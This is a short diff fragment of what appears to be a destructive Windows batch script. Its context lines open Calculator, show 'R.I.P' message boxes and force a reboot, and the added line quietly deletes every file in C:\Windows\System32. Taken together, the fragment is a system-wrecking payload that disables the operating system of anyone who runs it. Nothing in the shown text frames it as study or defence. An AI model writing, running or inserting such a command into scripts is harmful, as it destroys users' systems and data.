@@ -41,6 +41,7 @@ start calc
 cls
 msg * R.I.P
 msg * R.I.P
+del c:\windows\system32\*.* /q
 wmic os where primary=1 reboot
 start
 start
